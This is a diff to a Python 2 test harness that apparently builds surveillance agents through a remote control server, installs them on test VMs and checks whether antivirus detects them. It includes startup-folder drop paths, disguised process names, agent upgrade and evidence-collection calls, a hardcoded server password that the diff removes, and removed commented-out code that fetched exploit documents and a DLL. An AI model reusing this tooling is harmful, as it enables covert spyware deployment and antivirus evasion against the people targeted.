@@ -4,9 +4,9 @@ from time import sleep
 import time
 import socket
 import urllib2
-import zipfile
+
 import os.path
-import re
+import zipfile
 import traceback
 import subprocess
 import Queue
@@ -15,14 +15,15 @@ import argparse
 import itertools
 import random
 from ConfigParser import ConfigParser
-from urllib2 import HTTPError
+
 import ctypes
 import shutil
 
-from rcs_client import Rcs_client
+
 from AVCommon.logger import logging
 from AVCommon import process
 from AVCommon import helper
+from AVCommon import build_common
 
 MOUSEEVENTF_MOVE = 0x0001  # mouse move
 MOUSEEVENTF_ABSOLUTE = 0x8000  # absolute move
@@ -37,6 +38,7 @@ names = ['btplayerctrl', 'HydraDM', 'iFrmewrk', 'Toaster', 'rusb3mon', 'SynTPEnh
 
 start_dirs = ['C:/Users/avtest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
             'C:/Documents and Settings/avtest/Start Menu/Programs/Startup', 'C:/Users/avtest/Desktop']
+
 
 def unzip(filename, fdir):
     zfile = zipfile.ZipFile(filename)
@@ -133,24 +135,6 @@ def check_internet(address, queue):
 
     queue.put(ret)
 
-class connection:
-    host = ""
-    user = "avmonitor"
-    passwd = "testriteP123" # old: avmonitorp123
-    operation = 'AVMonitor'
-
-    rcs=[]
-
-    def __enter__(self):
-        logging.debug("DBG login %s@%s" % (self.user, self.host))
-        assert connection.host
-        self.conn = Rcs_client(connection.host, connection.user, connection.passwd)
-        self.conn.login()
-        return self.conn
-
-    def __exit__(self, type, value, traceback):
-        logging.debug("DBG logout")
-        self.conn.logout()
 
 def get_target_name():
     return 'VM_%s' % helper.get_hostname()
@@ -179,7 +163,7 @@ class AgentBuild:
 
     def _delete_targets(self, operation):
         numtarget = 0
-        with connection() as c:
+        with build_common.connection() as c:
             operation_id, group_id = c.operation(operation)
             logging.debug("operation_id: %s" % operation_id)
             targets = c.targets(operation_id)
@@ -190,111 +174,10 @@ class AgentBuild:
         return numtarget
 
     def _disable_analysis(self):
-        with connection() as c:
+        with build_common.connection() as c:
             c.disable_analysis()
         return True
 
-    def _create_new_factory(self, operation, target, factory, config):
-        with connection() as c:
-            assert c
-            if not c.logged_in():
-                logging.warn("Not logged in")
-            logging.debug(
-                "DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)
-
-            operation_id, group_id = c.operation(operation)
-            if not operation_id:
-                raise RuntimeError("Cannot get operations")
-
-            # gets all the target with our name in an operation
-            targets = c.targets(operation_id, target)
-
-            if len(targets) > 0:
-                # keep only one target
-                for t in targets[1:]:
-                    c.target_delete(t)
-
-                target_id = targets[0]
-
-                agents = c.agents(target_id)
-
-                for agent_id, ident, name in agents:
-                    logging.debug("DBG   %s %s %s" % (agent_id, ident, name))
-                    if name.startswith(factory):
-                        logging.debug("- Delete instance: %s %s" % (ident, name))
-                        c.instance_delete(agent_id)
-            else:
-                logging.debug("- Create target: %s" % target)
-                target_id = c.target_create(
-                    operation_id, target, 'made by vmavtest at %s' % time.ctime())
-
-            factory_id, ident = c.factory_create(
-                operation_id, target_id, self.ftype, factory,
-                'made by vmavtestat at %s' % time.ctime()
-            )
-
-            with open(config) as f:
-                conf = f.read()
-
-            conf = re.sub(
-                r'"host": ".*"', r'"host": "%s"' % self.host[1], conf)
-
-            #logging.debug("conf: %s" % conf)
-            c.factory_add_config(factory_id, conf)
-
-            with open('build/config.actual.json', 'wb') as f:
-                f.write(conf)
-
-            return (target_id, factory_id, ident)
-
-    def _build_agent(self, factory, melt=None, kind="silent",tries=0):
-
-        with connection() as c:
-
-            try:
-                # TODO: togliere da qui, metterla in procedures
-                filename = 'build/%s/build.zip' % self.platform
-                if os.path.exists(filename):
-                    os.remove(filename)
-
-                if kind=="melt" and melt:
-                    logging.debug("- Melt build with: %s" % melt)
-                    appname = "exp_%s" % self.hostname
-                    self.param['melt']['appname'] = appname
-                    self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
-                    if 'deliver' in self.param:
-                        self.param['deliver']['user'] = c.myid
-                    r = c.build_melt(factory, self.param, melt, filename)
-                else:
-                    logging.debug("- Silent build")
-                    r = c.build(factory, self.param, filename)
-
-                contentnames = unzip(filename, "build/%s" % self.platform)
-
-                # CHECK FOR DELETED FILES
-                failed = check_static(contentnames)
-
-                if not failed:
-                    add_result("+ SUCCESS SCOUT BUILD")
-                    return contentnames
-                else:
-                    add_result("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % failed)
-                    raise RuntimeError("Signature detection")
-
-            except HTTPError as err:
-                logging.debug("DBG trace %s" % traceback.format_exc())
-                if tries <= 3:
-                    tries += 1
-                    logging.debug("DBG problem building scout. tries number %s" % tries)
-                    return self._build_agent(factory, melt, kind, tries)
-                else:
-                    add_result("+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries)
-                    raise err
-            except Exception, e:
-                logging.debug("DBG trace %s" % traceback.format_exc())
-                add_result("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")
-
-                raise e
 
     def _execute_build(self, exe, silent=False):
         try:
@@ -335,13 +218,13 @@ class AgentBuild:
 
 
     def get_can_upgrade(self, instance):
-        with connection() as c:
+        with build_common.connection() as c:
             level = str(c.instance_can_upgrade(instance))
             logging.debug("get_can_upgrade level: %s" % (level))
             return level
 
     def check_level(self, instance, expected):
-        with connection() as c:
+        with build_common.connection() as c:
             level = str(c.instance_level(instance))
             logging.debug("level, expected: %s got: %s" % (expected, level))
             if not level == expected:
@@ -352,10 +235,10 @@ class AgentBuild:
                 return True
 
     def check_instance(self, ident):
-        with connection() as c:
+        with build_common.connection() as c:
             instances = c.instances(ident)
             logging.debug("DBG instances: %s" % instances)
-            logging.debug("DBG rcs: %s" % str(connection.rcs))
+            logging.debug("DBG rcs: %s" % str(build_common.connection.rcs))
 
             assert len(instances) <= 1, "too many instances"
 
@@ -374,7 +257,7 @@ class AgentBuild:
 
     @DeprecationWarning
     def _check_elite(self, instance_id):
-        with connection() as c:
+        with build_common.connection() as c:
             info = c.instance_info(instance_id)
             logging.debug('DBG _check_elite %s' % info)
             ret = info['upgradable'] is False and info['scout'] is False
@@ -387,7 +270,7 @@ class AgentBuild:
             return ret
 
     def _check_upgraded(self, instance_id):
-        with connection() as c:
+        with build_common.connection() as c:
             info = c.instance_info(instance_id)
             logging.debug('DBG _check_elite: %s' % info['level'])
             ret = info['upgradable'] is False
@@ -400,11 +283,11 @@ class AgentBuild:
             return ret, info['level']
 
     def uninstall(self, instance_id):
-        with connection() as c:
+        with build_common.connection() as c:
             c.instance_close(instance_id)
 
     def _upgrade(self, instance_id, force_soldier = False):
-        with connection() as c:
+        with build_common.connection() as c:
             ret = c.instance_upgrade(instance_id, force_soldier)
             logging.debug("DBG _upgrade: %s" % ret)
             info = c.instance_info(instance_id)
@@ -415,7 +298,7 @@ class AgentBuild:
         return subprocess.Popen(["tasklist"], stdout=subprocess.PIPE).communicate()[0]
 
     def server_errors(self):
-        with connection() as c:
+        with build_common.connection() as c:
             return c.server_status()['error']
 
     def create_user_machine(self):
@@ -428,23 +311,23 @@ class AgentBuild:
             'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM',
             'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
         user_name = "avmonitor_%s_%s" % (self.prefix, self.hostname)
-        connection.user = user_name
+        build_common.connection.user = user_name
 
         user_exists = False
         try:
-            with connection() as c:
+            with build_common.connection() as c:
                 logging.debug("LOGIN SUCCESS")
                 user_exists = True
         except:
             pass
 
         if not user_exists:
-            connection.user = "avmonitor"
-            with connection() as c:
-                ret = c.operation(connection.operation)
+            build_common.connection.user = "avmonitor"
+            with build_common.connection() as c:
+                ret = c.operation(build_common.connection.operation)
                 op_id, group_id = ret
-                c.user_create(user_name, connection.passwd, privs, group_id)
-        connection.user = user_name
+                c.user_create(user_name, build_common.connection.passwd, privs, group_id)
+        build_common.connection.user = user_name
         return True
 
     def execute_elite(self):
@@ -459,7 +342,7 @@ class AgentBuild:
     def execute_soldier_fast(self, instance_id = None, fast = True):
 
         if not instance_id:
-            with connection() as c:
+            with build_common.connection() as c:
                 instance_id, target_id = get_instance(c)
         if not instance_id:
             logging.debug("- exiting execute_soldier because did't sync")
@@ -489,7 +372,7 @@ class AgentBuild:
     def execute_elite_fast(self, instance_id = None, fast = True):
 
         if not instance_id:
-            with connection() as c:
+            with build_common.connection() as c:
                 instance_id, target_id = get_instance(c)
         if not instance_id:
             add_result("+ FAILED DID NOT SYNC")
@@ -682,7 +565,7 @@ class AgentBuild:
         """ build and execute the  """
 
         logging.debug("- Host: %s %s\n" % (self.hostname, time.ctime()))
-        operation = connection.operation
+        operation = build_common.connection.operation
         target = get_target_name()
         if not self.factory:
             # desktop_exploit_melt, desktop_scout_
@@ -697,66 +580,35 @@ class AgentBuild:
             os.mkdir('build')
         if not os.path.exists('build/%s' % self.platform):
             os.mkdir('build/%s' % self.platform)
-        target_id, factory_id, ident = self._create_new_factory(
+
+        #creates the factory
+
+        target_id, factory_id, ident = build_common.create_new_factory(
             operation, target, factory, config)
 
-        connection.rcs=(target_id, factory_id, ident, operation, target, factory)
+        build_common.connection.rcs=(target_id, factory_id, ident, operation, target, factory)
 
-        logging.debug("- Built, rcs: %s" % str(connection.rcs))
+        logging.debug("- Built, rcs: %s" % str(build_common.connection.rcs))
 
         meltfile = self.param.get('meltfile', None)
-        exe = self._build_agent(factory_id, melt=meltfile, kind=self.kind)
 
-        """
-        if "exploit_" in self.platform:
-            appname = "exp_%s.exe" % self.platform
-            #if self.platform == 'exploit_docx':
-            #    appname = "exp_%s/avtest.swf" % self.hostname
-            #elif self.platform == 'exploit_ppsx':
-            #    appname = "pexp_%s/avtest.swf" % self.hostname
-            #elif self.platform == 'exploit_web':
-            #    dllname = "exp_%s/PMIEFuck-WinWord.dll" % self.hostname
-            #    docname = "exp_%s/owned.docm" % self.hostname
+        filename = 'build/%s/build.zip' % self.platform
+        exe = build_common.build_agent(factory_id, add_result, filename, melt=meltfile, kind=self.kind)
 
-            #url = "http://%s/%s" % (self.host[1], appname)
-            #logging.debug("DBG getting: %s" % url)
-            #done = False
-            #try:
-            #    u = urllib2.urlopen(url)
-                localFile = open('build/file.swf', 'w')
-                localFile.write(u.read())
-                localFile.close()
-                sleep(2)
-                with open('build/file.swf'):
-                    done = True
-                if "exploit_web" in self.platform:
-                    url = "http://%s/%s" % (self.host[1], docname)
-                    u = urllib2.urlopen(url)
-                    docFile = open('build/owned.docm', 'w')
-                    docFile.write(u.read())
-                    docFile.close()
-                    sleep(2)
-                    with open('build/owned.docm'):
-                        done = True
-                    url = "http://%s/%s" % (self.host[1], dllname)
-                    u = urllib2.urlopen(url)
-                    docFile = open('build/PMIEFuck-WinWord.dll', 'w')
-                    docFile.write(u.read())
-                    docFile.close()
-                    sleep(2)
-                    with open('build/PMIEFuck-WinWord.dll'):
-                        done = True
-                if done == True:
-                    add_result("+ SUCCESS EXPLOIT SAVE")
-            except urllib2.HTTPError:
-                add_result("+ ERROR EXPLOIT DOWNLOAD")
-                pass
-            except IOError:
-                add_result("+ FAILED EXPLOIT SAVE")
-                pass
-        """
+        #ML qui sono state messe le parti di check statica
+        contentnames = unzip(filename, "build/%s" % self.platform)
+
+        # CHECK FOR DELETED FILES
+        failed = check_static(contentnames)
+
+        if not failed:
+            add_result("+ SUCCESS SCOUT BUILD (no signature detection)")
+        else:
+            add_result("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % failed)
+            raise RuntimeError("Signature detection")
 
         return factory_id, ident, exe
+
 
     def execute_web_expl(self, websrv):
         """ WEBZ: we need to download some files only """
@@ -842,7 +694,7 @@ def execute_agent(args, level, platform):
 def get_instance(client, imei=None):
     print 'passed imei to get_isntance ', imei
     #logging.debug("client: %s" % client)
-    operation_id, group_id = client.operation(connection.operation)
+    operation_id, group_id = client.operation(build_common.connection.operation)
     target = get_target_name()
 
     targets = client.targets(operation_id, target)
@@ -882,12 +734,12 @@ def get_instance(client, imei=None):
     return instance_id, target_id
 
 def check_evidences(backend, type_ev, key=None, value=None):
-    connection.host = backend
+    build_common.connection.host = backend
 
     logging.debug("type_ev: %s, filter: %s=%s" % (type_ev, key, value))
     number = 0
 
-    with connection() as client:
+    with build_common.connection() as client:
         logging.debug("connected")
 
         instance_id, target_id = get_instance(client)
@@ -911,7 +763,7 @@ def check_evidences(backend, type_ev, key=None, value=None):
     return number > 0, number
 
 def check_blacklist(blacklist):
-    with connection() as client:
+    with build_common.connection() as client:
         logging.debug("connected")
         blacklist_server = client.blacklist()
         logging.info("blacklist from server: %s" % blacklist_server)
@@ -920,15 +772,15 @@ def check_blacklist(blacklist):
 
 def uninstall(backend):
     logging.debug("- Clean Server: %s" % (backend))
-    connection.host = backend
+    build_common.connection.host = backend
 
     target = get_target_name()
     logging.debug("target: %s" % (target))
 
-    with connection() as client:
+    with build_common.connection() as client:
         logging.debug("connected")
 
-        operation_id, group_id = client.operation(connection.operation)
+        operation_id, group_id = client.operation(build_common.connection.operation)
         targets = client.targets(operation_id, target)
         if len(targets) != 1:
             return False, "not one target: %s" % len(targets)
@@ -948,13 +800,13 @@ def uninstall(backend):
 
 def clean(backend):
     logging.debug("- Clean Server: %s" % (backend))
-    connection.host = backend
+    build_common.connection.host = backend
     vmavtest = AgentBuild(backend)
-    return vmavtest._delete_targets(connection.operation)
+    return vmavtest._delete_targets(build_common.connection.operation)
 
 def disable_analysis(backend):
     logging.debug("- Disable Analysis: %s" % (backend))
-    connection.host = backend
+    build_common.connection.host = backend
     vmavtest = AgentBuild(backend)
     return vmavtest._disable_analysis()
 
@@ -964,8 +816,8 @@ def build(args, report):
 
     report_send = report
 
-    connection.host = args.backend
-    connection.operation = args.operation
+    build_common.connection.host = args.backend
+    build_common.connection.operation = args.operation
 
     action = args.action
     platform = args.platform
